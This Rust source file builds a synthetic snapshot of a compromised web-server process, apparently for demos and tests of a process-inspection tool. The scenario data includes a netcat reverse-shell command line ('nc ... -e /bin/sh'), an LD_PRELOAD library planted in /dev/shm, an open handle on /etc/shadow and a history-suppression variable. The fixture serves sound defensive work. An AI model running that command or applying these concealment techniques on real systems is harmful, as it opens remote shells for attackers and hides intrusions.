//! Synthetic snapshots for documentation, screenshots, offline demos and tests.
//!
//! The scenario is a deliberately suspicious process: a deleted executable
//! spawned by a web server, holding a reverse-shell socket, RWX memory and an
//! injected library. No real host data is involved.

use crate::model::*;

fn brief(pid: i32, ppid: i32, comm: &str, user: &str, cmd: &str) -> ProcBrief {
    ProcBrief {
        pid,
        ppid,
        comm: comm.into(),
        user: user.into(),
        cmdline: cmd.into(),
        exe_deleted: false,
    }
}

fn fd(fd: i32, target: &str, kind: FdKind, deleted: bool, flags: &str) -> FdEntry {
    FdEntry {
        fd,
        target: target.into(),
        kind,
        deleted,
        pos: Some(0),
        flags: Some(flags.into()),
        mnt_id: Some(24),
        inode: Some(100 + fd as u64),
        size: None,
    }
}

/// `tick` advances the scenario so the activity timeline and findings have
/// something to react to between refreshes.
pub fn snapshot(tick: u64) -> Snapshot {
    let host = HostInfo {
        hostname: "web-prod-07".into(),
        kernel: "Linux 6.1.0-21-amd64".into(),
        boot_time: 1_759_000_000,
        uptime_secs: 824_413.0,
        clk_tck: 100,
        page_size: 4096,
        num_cpus: 8,
        collector_uid: 0,
        ld_so_preload: vec!["/dev/shm/.cache/libncurse.so".into()],
    };

    let mut fds = vec![
        fd(0, "socket:[884211]", FdKind::Socket, false, "O_RDWR"),
        fd(1, "socket:[884211]", FdKind::Socket, false, "O_RDWR"),
        fd(2, "socket:[884211]", FdKind::Socket, false, "O_RDWR"),
        fd(
            3,
            "/var/www/html/uploads/.shell.php",
            FdKind::File,
            false,
            "O_RDONLY",
        ),
        fd(
            4,
            "/dev/shm/.cache/payload.bin",
            FdKind::File,
            true,
            "O_RDWR|O_CREAT",
        ),
        fd(5, "pipe:[884300]", FdKind::Pipe, false, "O_RDONLY"),
        fd(7, "/memfd:loader (deleted)", FdKind::Memfd, true, "O_RDWR"),
    ];

    let mut sockets = vec![
        SocketEntry {
            proto: "tcp".into(),
            local: "10.0.12.7:8080".into(),
            remote: String::new(),
            state: "LISTEN".into(),
            inode: 884000,
            fd: None,
            uid: Some(33),
            tx_queue: 0,
            rx_queue: 0,
            detail: String::new(),
        },
        SocketEntry {
            proto: "tcp".into(),
            local: "10.0.12.7:41022".into(),
            remote: "185.220.101.52:443".into(),
            state: "ESTABLISHED".into(),
            inode: 884211,
            fd: Some(0),
            uid: Some(33),
            tx_queue: 0,
            rx_queue: 128,
            detail: String::new(),
        },
    ];

    let mut children = vec![brief(5110, 4982, "sh", "www-data", "/bin/sh -i")];

    // Evolve the scenario on the second tick.
    if tick >= 1 {
        sockets.push(SocketEntry {
            proto: "tcp".into(),
            local: "10.0.12.7:41098".into(),
            remote: "91.219.236.14:9001".into(),
            state: "ESTABLISHED".into(),
            inode: 884990,
            fd: Some(9),
            uid: Some(33),
            tx_queue: 512,
            rx_queue: 0,
            detail: String::new(),
        });
        fds.push(fd(9, "socket:[884990]", FdKind::Socket, false, "O_RDWR"));
        fds.push(fd(11, "/etc/shadow", FdKind::File, false, "O_RDONLY"));
        children.push(brief(
            5231,
            4982,
            "nc",
            "www-data",
            "nc 91.219.236.14 9001 -e /bin/sh",
        ));
    }

    let maps = vec![
        MapEntry {
            start: 0x5600_0000_0000,
            end: 0x5600_0002_0000,
            perms: "r-xp".into(),
            offset: 0,
            dev: "00:00".into(),
            inode: 0,
            path: "/dev/shm/.cache/payload.bin (deleted)".into(),
            kind: MapKind::Deleted,
        },
        MapEntry {
            start: 0x7f00_0000_0000,
            end: 0x7f00_0004_0000,
            perms: "rwxp".into(),
            offset: 0,
            dev: "00:00".into(),
            inode: 0,
            path: String::new(),
            kind: MapKind::Anon,
        },
        MapEntry {
            start: 0x7f00_1000_0000,
            end: 0x7f00_1020_0000,
            perms: "r-xp".into(),
            offset: 0,
            dev: "fd:01".into(),
            inode: 51231,
            path: "/dev/shm/.cache/libncurse.so".into(),
            kind: MapKind::File,
        },
        MapEntry {
            start: 0x7f00_2000_0000,
            end: 0x7f00_2024_0000,
            perms: "r-xp".into(),
            offset: 0,
            dev: "fd:01".into(),
            inode: 98123,
            path: "/usr/lib/x86_64-linux-gnu/libc.so.6".into(),
            kind: MapKind::File,
        },
        MapEntry {
            start: 0x7fff_0000_0000,
            end: 0x7fff_0002_1000,
            perms: "rw-p".into(),
            offset: 0,
            dev: "00:00".into(),
            inode: 0,
            path: "[stack]".into(),
            kind: MapKind::Stack,
        },
    ];

    Snapshot {
        taken_at: format!("2026-10-06T12:0{}:0{}.000000Z", tick, tick * 7 % 10),
        collect_us: 2300 + tick * 120,
        exited: false,
        ident: Identity {
            pid: 4982,
            ppid: 1442,
            pgrp: 1442,
            session: 1442,
            tty_nr: 0,
            comm: "nginx".into(),
            cmdline: vec!["[kworker/u16:2]".into()],
            state: "R (running)".into(),
            cwd: "/var/www/html/uploads".into(),
            root: "/".into(),
            uid: [33, 0, 0, 33],
            gid: [33, 33, 33, 33],
            user: "www-data".into(),
            groups: vec![33],
            login_uid: None,
            audit_session: None,
            start_time: host.boot_time + 824_000,
            age_secs: 413.0 - tick as f64 * 4.0,
            num_threads: 3,
            nice: 0,
            priority: 20,
            processor: 2,
            utime_ticks: 140 + tick * 9,
            stime_ticks: 88 + tick * 14,
            cutime_ticks: 0,
            cstime_ticks: 0,
            minflt: 51234 + tick * 2000,
            majflt: 12,
            vsize: 412 * 1024 * 1024,
            rss_pages: 8600,
            wchan: "0".into(),
            oom_score: 10,
            oom_score_adj: 0,
            umask: "0022".into(),
            cpus_allowed: "0-7".into(),
            vol_ctxt: 9001 + tick * 40,
            nonvol_ctxt: 410 + tick * 11,
            personality: "0".into(),
            sched_policy: "SCHED_OTHER".into(),
            hidden_from_listing: false,
        },
        exe: ExeInfo {
            path: "/var/www/html/uploads/.nginx-worker (deleted)".into(),
            deleted: true,
            memfd: false,
            sha256: Some("3b1f8e6a9c2d4e7f0a1b2c3d4e5f60718293a4b5c6d7e8f901a2b3c4d5e6f708".into()),
            size: Some(2_154_832),
            mode: Some("755".into()),
            owner: Some("www-data:33".into()),
            inode: Some(787123),
            mtime: Some("2026-10-06T11:58:04.000000000Z".into()),
            atime: Some("2026-10-06T11:58:05.000000000Z".into()),
            ctime: Some("2026-10-06T11:58:06.000000000Z".into()),
            btime: Some("2026-10-06T11:58:04.000000000Z".into()),
            elf: Some("ELF64 LSB DYN x86-64".into()),
        },
        ancestry: vec![
            brief(
                1442,
                1,
                "nginx",
                "root",
                "nginx: master process /usr/sbin/nginx",
            ),
            brief(1, 0, "systemd", "root", "/sbin/init"),
        ],
        children,
        fds,
        sockets,
        maps,
        mem: MemSummary {
            vm_peak_kb: 460_800,
            vm_size_kb: 421_888,
            vm_rss_kb: 34_400 + tick * 900,
            vm_hwm_kb: 40_960,
            vm_swap_kb: 0,
            rss_anon_kb: 20_480,
            rss_file_kb: 13_920,
            rss_shmem_kb: 0,
            vm_data_kb: 51_200,
            vm_stk_kb: 132,
            vm_exe_kb: 2104,
            vm_lib_kb: 8400,
            pss_kb: Some(28_100),
            private_dirty_kb: Some(19_800),
            mem_total_kb: 16_304_128,
        },
        namespaces: vec![
            NsEntry {
                name: "mnt".into(),
                link: "mnt:[4026532211]".into(),
                init_link: Some("mnt:[4026531841]".into()),
            },
            NsEntry {
                name: "net".into(),
                link: "net:[4026531840]".into(),
                init_link: Some("net:[4026531840]".into()),
            },
            NsEntry {
                name: "pid".into(),
                link: "pid:[4026532212]".into(),
                init_link: Some("pid:[4026531836]".into()),
            },
        ],
        security: Security {
            cap_eff: CapSet {
                raw: "0000000000003000".into(),
                names: vec!["cap_net_admin".into(), "cap_net_raw".into()],
            },
            cap_prm: CapSet {
                raw: "0000000000003000".into(),
                names: vec!["cap_net_admin".into(), "cap_net_raw".into()],
            },
            cap_bnd: CapSet {
                raw: "000001ffffffffff".into(),
                names: vec!["cap_*".into()],
            },
            seccomp: "disabled".into(),
            no_new_privs: false,
            tracer_pid: 0,
            ..Security::default()
        },
        threads: {
            let mut t = vec![
                ThreadEntry {
                    tid: 4982,
                    comm: "nginx".into(),
                    state: "R".into(),
                    utime_ticks: 140,
                    stime_ticks: 88,
                    processor: 2,
                    priority: 20,
                    wchan: "0".into(),
                },
                ThreadEntry {
                    tid: 4983,
                    comm: "nginx".into(),
                    state: "S".into(),
                    utime_ticks: 10,
                    stime_ticks: 4,
                    processor: 5,
                    priority: 20,
                    wchan: "poll_schedule_timeout".into(),
                },
            ];
            if tick >= 1 {
                t.push(ThreadEntry {
                    tid: 5240,
                    comm: "crypto".into(),
                    state: "R".into(),
                    utime_ticks: 55,
                    stime_ticks: 2,
                    processor: 7,
                    priority: 20,
                    wchan: "0".into(),
                });
            }
            t
        },
        environ: vec![
            EnvVar {
                key: "PATH".into(),
                value: "/usr/local/sbin:/usr/local/bin:/usr/bin".into(),
            },
            EnvVar {
                key: "LD_PRELOAD".into(),
                value: "/dev/shm/.cache/libncurse.so".into(),
            },
            EnvVar {
                key: "HISTFILE".into(),
                value: "/dev/null".into(),
            },
            EnvVar {
                key: "PWD".into(),
                value: "/var/www/html/uploads".into(),
            },
        ],
        limits: vec![
            LimitEntry {
                name: "Max open files".into(),
                soft: "1024".into(),
                hard: "524288".into(),
                unit: "files".into(),
            },
            LimitEntry {
                name: "Max processes".into(),
                soft: "63000".into(),
                hard: "63000".into(),
                unit: "processes".into(),
            },
        ],
        cgroups: vec!["0::/system.slice/nginx.service".into()],
        io: IoStats {
            rchar: 1_204_993,
            wchar: 88_400,
            syscr: 4021,
            syscw: 1992,
            read_bytes: 843_776,
            write_bytes: 0,
            cancelled_write_bytes: 0,
            available: true,
        },
        kernel_stack: vec![
            "[<0>] do_sys_openat2+0x9b/0x160".into(),
            "[<0>] __x64_sys_openat+0x55/0xa0".into(),
        ],
        mount_count: 32,
        errors: vec![],
        host,
    }
}
